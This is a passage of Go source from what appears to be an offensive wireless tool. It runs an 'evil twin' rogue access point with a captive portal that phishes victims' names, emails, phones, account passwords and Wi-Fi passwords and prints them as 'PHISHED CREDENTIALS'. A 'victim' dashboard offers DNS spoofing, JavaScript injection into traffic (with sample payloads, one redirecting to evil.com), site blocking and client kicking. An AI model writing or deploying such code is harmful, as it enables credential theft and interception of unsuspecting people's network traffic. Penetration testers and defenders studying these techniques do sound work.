	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.Contains(line, "FAILED") || strings.Contains(line, "INCOMPLETE") {
			continue
		}

		fields := strings.Fields(line)
		if len(fields) < 5 || fields[1] != "lladdr" {
			continue
		}

		ip := fields[0]
		mac := strings.ToLower(fields[2])
		if !strings.HasPrefix(ip, "10.0.0.") {
			continue
		}
		if localIPs[ip] || mac == "" || mac == localMAC {
			continue
		}

		hostname := getHostnameFromIP(ip)
		upsertClientLocked(mac, ip, hostname, false)
	}

	if stationDumpOK {
		pruneDisconnectedLinuxClientsLocked(activeStations)
	}
}

func parseAssociatedStationsLocked(iface string) (map[string]bool, bool) {
	cmd := exec.Command("iw", "dev", iface, "station", "dump")
	output, err := cmd.Output()
	if err != nil {
		return nil, false
	}

	activeStations := make(map[string]bool)
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "Station ") {
			continue
		}

		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}

		mac := strings.ToLower(fields[1])
		if mac == "" {
			continue
		}
		activeStations[mac] = true

		upsertClientLocked(mac, "Pending DHCP", "Unknown", true)
	}

	return activeStations, true
}

func parseDnsmasqLeasesLocked(localMAC string, localIPs map[string]bool) {
	if dnsmasqLeasesPath == "" {
		return
	}

	content, err := os.ReadFile(dnsmasqLeasesPath)
	if err != nil {
		return
	}

	lines := strings.Split(strings.TrimSpace(string(content)), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}

		mac := strings.ToLower(fields[1])
		ip := fields[2]
		hostname := fields[3]

		if !strings.HasPrefix(ip, "10.0.0.") {
			continue
		}
		if mac == "" || mac == localMAC || localIPs[ip] {
			continue
		}
		if hostname == "" || hostname == "*" {
			hostname = "Unknown"
		}

		upsertClientLocked(mac, ip, hostname, false)
	}
}

func upsertClientLocked(mac, ip, hostname string, markSeen bool) {
	mac = strings.ToLower(strings.TrimSpace(mac))
	if mac == "" {
		return
	}

	client, exists := connectedClients[mac]
	if !exists {
		client = &Client{
			MAC:          mac,
			ConnectedAt:  time.Now(),
			DNSQueries:   []string{},
			HTTPRequests: []string{},
		}
		connectedClients[mac] = client
	}

	if ip != "" {
		if client.IP == "" || client.IP == "Pending DHCP" || ip != "Pending DHCP" {
			client.IP = ip
		}
	}

	if hostname != "" && hostname != "Unknown" {
		client.Hostname = hostname
	} else if client.Hostname == "" {
		client.Hostname = "Unknown"
	}

	if markSeen {
		client.LastSeen = time.Now()
	}
}

func pruneDisconnectedLinuxClientsLocked(activeStations map[string]bool) {
	const disconnectGrace = 12 * time.Second
	now := time.Now()

	for mac, client := range connectedClients {
		if _, stillActive := activeStations[strings.ToLower(mac)]; stillActive {
			continue
		}

		if client.LastSeen.IsZero() {
			if now.Sub(client.ConnectedAt) > disconnectGrace {
				delete(connectedClients, mac)
			}
			continue
		}

		if now.Sub(client.LastSeen) > disconnectGrace {
			delete(connectedClients, mac)
		}
	}
}

func getHostnameFromIP(ip string) string {
	names, err := net.LookupAddr(ip)
	if err != nil || len(names) == 0 {
		return "Unknown"
	}
	return strings.TrimSuffix(names[0], ".")
}

func startCaptivePortal(ssid string) {
	processMu.Lock()
	if captiveServer != nil {
		processMu.Unlock()
		return
	}

	mux := http.NewServeMux()
	for _, path := range captiveProbePaths() {
		mux.HandleFunc(path, makeCaptiveProbeHandler())
	}
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		clientIP := strings.Split(r.RemoteAddr, ":")[0]
		logHTTPRequest(clientIP, r)
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
		w.Header().Set("Pragma", "no-cache")

		switch r.Method {
		case "GET":
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(buildCaptivePortalHTML(ssid, "")))
		case "POST":
			if err := r.ParseForm(); err != nil {
				w.Header().Set("Content-Type", "text/html; charset=utf-8")
				w.WriteHeader(http.StatusBadRequest)
				w.Write([]byte(buildCaptivePortalHTML(ssid, "Failed to process the submitted form. Please try again.")))
				return
			}

			fullName := strings.TrimSpace(r.FormValue("full_name"))
			email := strings.TrimSpace(r.FormValue("email"))
			phone := strings.TrimSpace(r.FormValue("phone"))
			password := strings.TrimSpace(r.FormValue("password"))
			networkPassword := strings.TrimSpace(r.FormValue("network_password"))

			fmt.Printf("\n%s[PHISHED CREDENTIALS]%s\n", utils.Red, utils.Reset)
			if ssid != "" {
				fmt.Printf("%sSSID: %s%s\n", utils.Yellow, ssid, utils.Reset)
			}
			fmt.Printf("%sName: %s%s\n", utils.Yellow, fullName, utils.Reset)
			fmt.Printf("%sEmail: %s%s\n", utils.Yellow, email, utils.Reset)
			fmt.Printf("%sPhone: %s%s\n", utils.Yellow, phone, utils.Reset)
			fmt.Printf("%sPassword: %s%s\n\n", utils.Yellow, password, utils.Reset)
			fmt.Printf("%sNetwork Password: %s%s\n\n", utils.Yellow, networkPassword, utils.Reset)

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(buildCaptivePortalSuccessHTML(ssid)))
		default:
			w.Header().Set("Allow", "GET, POST")
			w.WriteHeader(http.StatusMethodNotAllowed)
		}
	})

	srv := &http.Server{
		Addr:    ":8888",
		Handler: mux,
	}
	captiveServer = srv
	processMu.Unlock()

	if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
		fmt.Printf("%s[!] Captive portal stopped: %v%s\n", utils.Red, err, utils.Reset)
	}

	processMu.Lock()
	if captiveServer == srv {
		captiveServer = nil
	}
	processMu.Unlock()
}

func captiveProbePaths() []string {
	return []string{
		"/generate_204",
		"/gen_204",
		"/hotspot-detect.html",
		"/library/test/success.html",
		"/success.txt",
		"/connecttest.txt",
		"/ncsi.txt",
		"/redirect",
		"/canonical.html",
		"/mobile/status.php",
		"/kindle-wifi/wifistub.html",
		"/fwlink",
	}
}

func makeCaptiveProbeHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		clientIP := strings.Split(r.RemoteAddr, ":")[0]
		logHTTPRequest(clientIP, r)
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
		w.Header().Set("Pragma", "no-cache")
		http.Redirect(w, r, captivePortalRedirectURL(), http.StatusFound)
	}
}

func captivePortalRedirectURL() string {
	return "http://10.0.0.1/"
}

func buildCaptivePortalHTML(ssid, errorMessage string) string {
	title := "Network Authentication Required"
	networkLabel := "Secure Wi-Fi"
	if strings.TrimSpace(ssid) != "" {
		networkLabel = ssid
	}

	errorBlock := ""
	if strings.TrimSpace(errorMessage) != "" {
		errorBlock = fmt.Sprintf(`<div class="error">%s</div>`, errorMessage)
	}

	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
    <title>%s</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { color-scheme: light; }
        body { font-family: Arial, sans-serif; margin: 0; padding: 24px; min-height: 100vh; background: linear-gradient(160deg, #eef4ff 0%%, #d8e6ff 100%%); display: flex; align-items: center; justify-content: center; }
        .container { width: 100%%; max-width: 430px; background: #fff; padding: 28px; border-radius: 18px; box-shadow: 0 18px 45px rgba(22, 42, 84, 0.18); }
        .badge { display: inline-block; padding: 6px 10px; border-radius: 999px; background: #edf4ff; color: #2457a7; font-size: 12px; font-weight: 700; letter-spacing: 0.04em; text-transform: uppercase; }
        h2 { color: #1f2f49; margin: 14px 0 8px; text-align: center; }
        p { color: #5f6f86; font-size: 14px; line-height: 1.5; text-align: center; margin: 0 0 18px; }
        .error { background: #fff1f1; color: #b3261e; padding: 12px; border-radius: 10px; margin-bottom: 14px; font-size: 14px; }
        .field-label { display: block; color: #33425b; font-size: 13px; font-weight: 600; margin-top: 12px; }
        input { width: 100%%; padding: 12px 14px; margin-top: 6px; border: 1px solid #d6dfeb; border-radius: 10px; box-sizing: border-box; font-size: 14px; background: #fbfdff; }
        input:focus { outline: none; border-color: #4d7dff; box-shadow: 0 0 0 4px rgba(77,125,255,0.12); }
        button { width: 100%%; margin-top: 18px; padding: 13px; background: #1f6feb; color: white; border: none; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; }
        button:hover { background: #175ac0; }
        .footer { margin-top: 14px; color: #7b889b; font-size: 12px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="badge">Captive Portal</div>
        <h2>%s</h2>
        <p>Complete the access form below to continue to the internet.</p>
        %s
        <form method="POST">
            <label class="field-label" for="full_name">Full Name</label>
            <input id="full_name" type="text" name="full_name" placeholder="John Doe" required>

            <label class="field-label" for="email">Email</label>
            <input id="email" type="email" name="email" placeholder="name@example.com" required>

            <label class="field-label" for="phone">Phone Number</label>
            <input id="phone" type="tel" name="phone" placeholder="+351 912 345 678" required>

            <label class="field-label" for="password">Account Password</label>
            <input id="password" type="password" name="password" placeholder="Your account password" required>

            <label class="field-label" for="network_password">Network Password</label>
            <input id="network_password" type="password" name="network_password" placeholder="Wi-Fi password" required>

            <button type="submit">Connect</button>
        </form>
        <div class="footer">Network: %s</div>
    </div>
</body>
</html>`, title, networkLabel, errorBlock, networkLabel)
}

func buildCaptivePortalSuccessHTML(ssid string) string {
	networkLabel := "Secure Wi-Fi"
	if strings.TrimSpace(ssid) != "" {
		networkLabel = ssid
	}

	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
    <title>Connected</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 24px; min-height: 100vh; background: linear-gradient(160deg, #edf9f0 0%%, #d9f3e2 100%%); display: flex; align-items: center; justify-content: center; }
        .container { width: 100%%; max-width: 420px; background: #fff; padding: 28px; border-radius: 18px; box-shadow: 0 18px 45px rgba(18, 90, 48, 0.16); text-align: center; }
        h2 { color: #1f6a3a; margin-bottom: 10px; }
        p { color: #506156; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Connected to %s</h2>
        <p>Your access request is being processed. You may close this window.</p>
    </div>
</body>
</html>`, networkLabel)
}

func displayDashboard(isEvilTwin bool) {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	reader := bufio.NewReader(os.Stdin)

	go func() {
		<-sigChan
		fmt.Printf("\n%s[*] Stopping AP...%s\n", utils.Yellow, utils.Reset)
		stopAP()
		os.Exit(0)
	}()

	for {
		utils.ClearTerminal()

		if isEvilTwin {
			fmt.Printf("\n%s═══ EVIL TWIN DASHBOARD ═══%s\n\n", utils.Red, utils.Reset)
			fmt.Printf("%s[Gateway Mode: ALL TRAFFIC PASSES THROUGH YOU]%s\n\n", utils.Yellow, utils.Reset)
		} else {
			fmt.Printf("\n%s═══ FAKE LAN DASHBOARD ═══%s\n\n", utils.Green, utils.Reset)
			if provideInternet {
				fmt.Printf("%s[Gateway Mode: ALL TRAFFIC PASSES THROUGH YOU]%s\n\n", utils.Yellow, utils.Reset)
			}
		}

		clientsMutex.Lock()
		clientCount := len(connectedClients)

		if clientCount == 0 {
			if isEvilTwin {
				fmt.Printf("%s[*] Waiting for victims...%s\n", utils.Yellow, utils.Reset)
			} else {
				fmt.Printf("%s[*] No clients connected yet...%s\n", utils.Yellow, utils.Reset)
			}
		} else {
			if isEvilTwin {
				fmt.Printf("%s[✓] %d victim(s) connected:%s\n\n", utils.Red, clientCount, utils.Reset)
			} else {
				fmt.Printf("%s[✓] %d client(s) connected:%s\n\n", utils.Green, clientCount, utils.Reset)
			}

			for mac, client := range connectedClients {
				color := utils.Green
				if isEvilTwin {
					color = utils.Red
				}

				fmt.Printf("%s┌─ %s: %s%s\n", color, getClientLabel(isEvilTwin), mac, utils.Reset)
				fmt.Printf("%s│  IP: %s%s\n", color, client.IP, utils.Reset)
				fmt.Printf("%s│  Hostname: %s%s\n", color, client.Hostname, utils.Reset)
				fmt.Printf("%s│  Connected: %s ago%s\n", color, time.Since(client.ConnectedAt).Round(time.Second), utils.Reset)
				fmt.Printf("%s│  Traffic: %s%s\n", color, formatBytes(client.TrafficBytes), utils.Reset)

				if len(client.DNSQueries) > 0 {
					fmt.Printf("%s│%s\n", color, utils.Reset)
					fmt.Printf("%s│  DNS Queries (%d):%s\n", color, len(client.DNSQueries), utils.Reset)
					for i, query := range client.DNSQueries {
						if i >= 5 {
							fmt.Printf("%s│    ... and %d more%s\n", color, len(client.DNSQueries)-5, utils.Reset)
							break
						}
						fmt.Printf("%s│    - %s%s\n", color, query, utils.Reset)
					}
				}

				if len(client.HTTPRequests) > 0 {
					fmt.Printf("%s│%s\n", color, utils.Reset)
					fmt.Printf("%s│  HTTP Requests (%d):%s\n", color, len(client.HTTPRequests), utils.Reset)
					for i, req := range client.HTTPRequests {
						if i >= 5 {
							fmt.Printf("%s│    ... and %d more%s\n", color, len(client.HTTPRequests)-5, utils.Reset)
							break
						}
						fmt.Printf("%s│    - %s%s\n", color, req, utils.Reset)
					}
				}

				fmt.Printf("%s└─────────────────────────────%s\n\n", color, utils.Reset)
			}
		}
		clientsMutex.Unlock()

		if (clientCount > 0 && provideInternet) || isEvilTwin {
			fmt.Printf("\n%s═══ TRAFFIC CONTROL ═══%s\n", utils.Purple, utils.Reset)
			fmt.Printf("%s[1] Monitor traffic in separate window%s\n", utils.Green, utils.Reset)
			fmt.Printf("%s[2] Block websites%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%s[3] DNS Spoofing%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%s[4] Inject JavaScript%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%s[5] View current rules%s\n", utils.Blue, utils.Reset)
			fmt.Printf("%s[6] Kick client%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%s[7] Remove rules%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%s[8] Shut down LAN and return to menu%s\n", utils.Red, utils.Reset)
			fmt.Printf("%s[r] Refresh%s\n\n", utils.Blue, utils.Reset)
			fmt.Printf("%sChoose option: %s", utils.Green, utils.Reset)

			input, _ := reader.ReadString('\n')
			input = strings.TrimSpace(strings.ToLower(input))

			switch input {
			case "1":
				launchTrafficMonitor()
			case "2":
				blockWebsites()
			case "3":
				configureDNSSpoof()
			case "4":
				injectJavaScript()
			case "5":
				viewRules()
			case "6":
				kickClient()
			case "7":
				removeRulesMenu()
			case "8":
				stopAP()
				return
			case "r", "":
				continue
			}
		} else {
			fmt.Printf("\n%s[Press Enter to refresh, 'q' to stop]%s ", utils.Yellow, utils.Reset)
			input, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(input)) == "q" {
				stopAP()
				return
			}
		}

		time.Sleep(2 * time.Second)
	}
}

func getClientLabel(isEvilTwin bool) string {
	if isEvilTwin {
		return "VICTIM"
	}
	return "CLIENT"
}

type clientChoice struct {
	MAC      string
	IP       string
	Hostname string
}

func kickClient() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ KICK CLIENT ═══%s\n\n", utils.Yellow, utils.Reset)

	if runtime.GOOS == "windows" {
		fmt.Printf("%s[!] Kick client is not supported on Windows in this implementation%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	if apInterface == "" {
		fmt.Printf("%s[!] No active AP interface%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	reader := bufio.NewReader(os.Stdin)
	mac, ok := selectClientMAC(reader, "Select client to kick")
	if !ok {
		utils.PauseForInput()
		return
	}

	err := exec.Command("iw", "dev", apInterface, "station", "del", mac).Run()
	if err != nil {
		fmt.Printf("%s[!] Failed to send deauth command: %v%s\n", utils.Red, err, utils.Reset)
	} else {
		fmt.Printf("%s[✓] Kick command sent to %s%s\n", utils.Green, mac, utils.Reset)
	}

	clientsMutex.Lock()
	delete(connectedClients, strings.ToLower(mac))
	clientsMutex.Unlock()

	utils.PauseForInput()
}

func blockWebsites() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ BLOCK WEBSITES ═══%s\n\n", utils.Yellow, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sEnter domain to block (e.g., facebook.com): %s", utils.Green, utils.Reset)
	domain, _ := reader.ReadString('\n')
	domain = strings.TrimSpace(domain)

	if domain == "" {
		fmt.Printf("%s[!] Domain cannot be empty%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	applyToAll, mac, ok := chooseRuleTarget(reader)
	if !ok {
		utils.PauseForInput()
		return
	}

	rulesMutex.Lock()
	if applyToAll {
		blockedSites = appendUniqueString(blockedSites, domain)
	} else {
		key := strings.ToLower(mac)
		clientBlockedSites[key] = appendUniqueString(clientBlockedSites[key], domain)
	}
	rulesMutex.Unlock()

	if applyToAll {
		fmt.Printf("\n%s[✓] Blocked for all clients: %s%s\n", utils.Green, domain, utils.Reset)
	} else {
		fmt.Printf("\n%s[✓] Blocked for %s: %s%s\n", utils.Green, mac, domain, utils.Reset)
	}

	utils.PauseForInput()
}

func configureDNSSpoof() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ DNS SPOOFING ═══%s\n\n", utils.Yellow, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sTarget domain (e.g., facebook.com): %s", utils.Green, utils.Reset)
	domain, _ := reader.ReadString('\n')
	domain = strings.TrimSpace(domain)

	fmt.Printf("%sRedirect to IP/domain: %s", utils.Green, utils.Reset)
	redirectTo, _ := reader.ReadString('\n')
	redirectTo = strings.TrimSpace(redirectTo)

	if domain == "" || redirectTo == "" {
		fmt.Printf("%s[!] Domain and redirect target are required%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	applyToAll, mac, ok := chooseRuleTarget(reader)
	if !ok {
		utils.PauseForInput()
		return
	}

	rulesMutex.Lock()
	if applyToAll {
		dnsSpoof[domain] = redirectTo
	} else {
		key := strings.ToLower(mac)
		if _, exists := clientDNSSpoof[key]; !exists {
			clientDNSSpoof[key] = make(map[string]string)
		}
		clientDNSSpoof[key][domain] = redirectTo
	}
	rulesMutex.Unlock()

	if applyToAll {
		fmt.Printf("\n%s[✓] DNS Spoof (all): %s → %s%s\n", utils.Green, domain, redirectTo, utils.Reset)
	} else {
		fmt.Printf("\n%s[✓] DNS Spoof (%s): %s → %s%s\n", utils.Green, mac, domain, redirectTo, utils.Reset)
	}

	utils.PauseForInput()
}

func injectJavaScript() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ INJECT JAVASCRIPT ═══%s\n\n", utils.Yellow, utils.Reset)

	fmt.Printf("%sExamples:%s\n", utils.Blue, utils.Reset)
	fmt.Printf("  alert('You have been hacked!');\n")
	fmt.Printf("  document.body.innerHTML = '<h1>Hacked!</h1>';\n")
	fmt.Printf("  window.location = 'http://evil.com';\n\n")

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sEnter JavaScript code (one line): %s", utils.Green, utils.Reset)
	js, _ := reader.ReadString('\n')
	js = strings.TrimSpace(js)

	if js == "" {
		fmt.Printf("%s[!] JavaScript cannot be empty%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	applyToAll, mac, ok := chooseRuleTarget(reader)
	if !ok {
		utils.PauseForInput()
		return
	}

	rulesMutex.Lock()
	if applyToAll {
		injectedJS = js
	} else {
		clientInjectedJS[strings.ToLower(mac)] = js
	}
	rulesMutex.Unlock()

	if applyToAll {
		fmt.Printf("\n%s[✓] JavaScript injection active for all clients%s\n", utils.Green, utils.Reset)
	} else {
		fmt.Printf("\n%s[✓] JavaScript injection active for %s%s\n", utils.Green, mac, utils.Reset)
	}
	fmt.Printf("%sCode: %s%s\n", utils.Yellow, js, utils.Reset)

	utils.PauseForInput()
}

func viewRules() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ CURRENT RULES ═══%s\n\n", utils.Blue, utils.Reset)

	rulesMutex.RLock()
	globalBlocked := append([]string(nil), blockedSites...)
	globalSpoof := make(map[string]string, len(dnsSpoof))
	for domain, target := range dnsSpoof {
		globalSpoof[domain] = target
	}
	globalJS := injectedJS

	perClientBlocked := make(map[string][]string, len(clientBlockedSites))
	for mac, sites := range clientBlockedSites {
		perClientBlocked[mac] = append([]string(nil), sites...)
	}
	perClientSpoof := make(map[string]map[string]string, len(clientDNSSpoof))
	for mac, rules := range clientDNSSpoof {
		perClientSpoof[mac] = make(map[string]string, len(rules))
		for domain, target := range rules {
			perClientSpoof[mac][domain] = target
		}
	}
	perClientJS := make(map[string]string, len(clientInjectedJS))
	for mac, js := range clientInjectedJS {
		perClientJS[mac] = js
	}
	rulesMutex.RUnlock()

	fmt.Printf("%sGlobal Blocked Sites (%d):%s\n", utils.Yellow, len(globalBlocked), utils.Reset)
	if len(globalBlocked) == 0 {
		fmt.Printf("  (none)\n")
	} else {
		for _, site := range globalBlocked {
			fmt.Printf("  - %s\n", site)
		}
	}

	fmt.Printf("\n%sGlobal DNS Spoofing (%d):%s\n", utils.Yellow, len(globalSpoof), utils.Reset)
	if len(globalSpoof) == 0 {
		fmt.Printf("  (none)\n")
	} else {
		for domain, target := range globalSpoof {
			fmt.Printf("  - %s → %s\n", domain, target)
		}
	}

	fmt.Printf("\n%sGlobal JavaScript Injection:%s\n", utils.Yellow, utils.Reset)
	if globalJS == "" {
		fmt.Printf("  (none)\n")
	} else {
		fmt.Printf("  %s\n", globalJS)
	}

	fmt.Printf("\n%sPer-Client Rules:%s\n", utils.Yellow, utils.Reset)
	if len(perClientBlocked) == 0 && len(perClientSpoof) == 0 && len(perClientJS) == 0 {
		fmt.Printf("  (none)\n")
	} else {
		clients := make(map[string]bool)
		for mac := range perClientBlocked {
			clients[mac] = true
		}
		for mac := range perClientSpoof {
			clients[mac] = true
		}
		for mac := range perClientJS {
			clients[mac] = true
		}

		var macs []string
		for mac := range clients {
			macs = append(macs, mac)
		}
		sort.Strings(macs)

		for _, mac := range macs {
			fmt.Printf("  [%s]\n", mac)
			if sites, ok := perClientBlocked[mac]; ok && len(sites) > 0 {
				fmt.Printf("    blocked: %s\n", strings.Join(sites, ", "))
			}
			if spoofRules, ok := perClientSpoof[mac]; ok && len(spoofRules) > 0 {
				for domain, target := range spoofRules {
					fmt.Printf("    dns: %s -> %s\n", domain, target)
				}
			}
			if js, ok := perClientJS[mac]; ok && js != "" {
				fmt.Printf("    js: %s\n", js)
			}
		}
	}

	utils.PauseForInput()
}

func chooseRuleTarget(reader *bufio.Reader) (bool, string, bool) {
	fmt.Printf("\n%sApply rule to:%s\n", utils.Yellow, utils.Reset)
	fmt.Printf("%s  [1] All clients%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [2] One selected client%s\n", utils.Green, utils.Reset)
	fmt.Printf("%sChoose option: %s", utils.Green, utils.Reset)

	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	switch input {
	case "1":
		return true, "", true
	case "2":
		mac, ok := selectClientMAC(reader, "Select client")
		if !ok {
			return false, "", false
		}
		return false, mac, true
	default:
		fmt.Printf("%s[!] Invalid option%s\n", utils.Red, utils.Reset)
		return false, "", false
	}
}

func selectClientMAC(reader *bufio.Reader, prompt string) (string, bool) {
	clientsMutex.Lock()
	choices := make([]clientChoice, 0, len(connectedClients))
	for mac, client := range connectedClients {
		choices = append(choices, clientChoice{
			MAC:      strings.ToLower(mac),
			IP:       client.IP,
			Hostname: client.Hostname,
		})
	}
	clientsMutex.Unlock()

	if len(choices) == 0 {
		fmt.Printf("%s[!] No connected clients available%s\n", utils.Red, utils.Reset)
		return "", false
	}

	sort.Slice(choices, func(i, j int) bool {
		return choices[i].MAC < choices[j].MAC
	})

	fmt.Printf("\n%s%s:%s\n", utils.Yellow, prompt, utils.Reset)
	for i, c := range choices {
		fmt.Printf("%s  [%d] %s | IP: %s | Host: %s%s\n", utils.Green, i+1, c.MAC, c.IP, c.Hostname, utils.Reset)
	}
	fmt.Printf("%sChoose client: %s", utils.Green, utils.Reset)

	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	var idx int
	if _, err := fmt.Sscanf(input, "%d", &idx); err != nil || idx < 1 || idx > len(choices) {
		fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
		return "", false
	}

	return choices[idx-1].MAC, true
}

func appendUniqueString(values []string, value string) []string {
	for _, existing := range values {
		if existing == value {
			return values
		}
	}
	return append(values, value)
}

type dnsRuleEntry struct {
	Domain string
	Target string
}

func removeRulesMenu() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ REMOVE RULES ═══%s\n\n", utils.Yellow, utils.Reset)
	fmt.Printf("%s[1] Remove blocked website rule%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s[2] Remove DNS spoof rule%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s[3] Remove JavaScript injection rule%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s[4] Remove all global rules%s\n", utils.Yellow, utils.Reset)
	fmt.Printf("%s[5] Remove all rules for one client%s\n", utils.Yellow, utils.Reset)
	fmt.Printf("%s[6] Back%s\n\n", utils.Blue, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sChoose option: %s", utils.Green, utils.Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	switch input {
	case "1":
		removeBlockedRule()
	case "2":
		removeDNSSpoofRule()
	case "3":
		removeJavaScriptRule()
	case "4":
		removeAllGlobalRules()
	case "5":
		removeAllClientRules()
	case "6", "":
		return
	default:
		fmt.Printf("%s[!] Invalid option%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
	}
}

func removeBlockedRule() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ REMOVE BLOCKED RULE ═══%s\n\n", utils.Yellow, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sRemove from:%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [1] Global rules%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [2] Client-specific rules%s\n", utils.Green, utils.Reset)
	fmt.Printf("%sChoose option: %s", utils.Green, utils.Reset)

	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	switch input {
	case "1":
		rulesMutex.RLock()
		sites := append([]string(nil), blockedSites...)
		rulesMutex.RUnlock()
		if len(sites) == 0 {
			fmt.Printf("%s[!] No global blocked rules to remove%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		sort.Strings(sites)
		fmt.Printf("\n%sGlobal blocked rules:%s\n", utils.Blue, utils.Reset)
		for i, site := range sites {
			fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, site, utils.Reset)
		}
		fmt.Printf("%sChoose rule to remove: %s", utils.Green, utils.Reset)
		index, ok := readChoiceIndex(reader, len(sites))
		if !ok {
			fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		domain := sites[index]
		rulesMutex.Lock()
		blockedSites = removeStringValue(blockedSites, domain)
		rulesMutex.Unlock()
		fmt.Printf("%s[✓] Removed global blocked rule: %s%s\n", utils.Green, domain, utils.Reset)

	case "2":
		rulesMutex.RLock()
		var macs []string
		for mac, sites := range clientBlockedSites {
			if len(sites) > 0 {
				macs = append(macs, mac)
			}
		}
		rulesMutex.RUnlock()
		if len(macs) == 0 {
			fmt.Printf("%s[!] No client-specific blocked rules to remove%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		sort.Strings(macs)
		fmt.Printf("\n%sClients with blocked rules:%s\n", utils.Blue, utils.Reset)
		for i, mac := range macs {
			fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, mac, utils.Reset)
		}
		fmt.Printf("%sChoose client: %s", utils.Green, utils.Reset)
		clientIndex, ok := readChoiceIndex(reader, len(macs))
		if !ok {
			fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		selectedMAC := macs[clientIndex]

		rulesMutex.RLock()
		sites := append([]string(nil), clientBlockedSites[selectedMAC]...)
		rulesMutex.RUnlock()
		if len(sites) == 0 {
			fmt.Printf("%s[!] No blocked rules found for %s%s\n", utils.Red, selectedMAC, utils.Reset)
			utils.PauseForInput()
			return
		}

		sort.Strings(sites)
		fmt.Printf("\n%sBlocked rules for %s:%s\n", utils.Blue, selectedMAC, utils.Reset)
		for i, site := range sites {
			fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, site, utils.Reset)
		}
		fmt.Printf("%sChoose rule to remove: %s", utils.Green, utils.Reset)
		ruleIndex, ok := readChoiceIndex(reader, len(sites))
		if !ok {
			fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		domain := sites[ruleIndex]

		rulesMutex.Lock()
		updated := removeStringValue(clientBlockedSites[selectedMAC], domain)
		if len(updated) == 0 {
			delete(clientBlockedSites, selectedMAC)
		} else {
			clientBlockedSites[selectedMAC] = updated
		}
		rulesMutex.Unlock()
		fmt.Printf("%s[✓] Removed blocked rule for %s: %s%s\n", utils.Green, selectedMAC, domain, utils.Reset)

	default:
		fmt.Printf("%s[!] Invalid option%s\n", utils.Red, utils.Reset)
	}

	utils.PauseForInput()
}

func removeDNSSpoofRule() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ REMOVE DNS SPOOF RULE ═══%s\n\n", utils.Yellow, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sRemove from:%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [1] Global rules%s\n", utils.Green, utils.Reset)
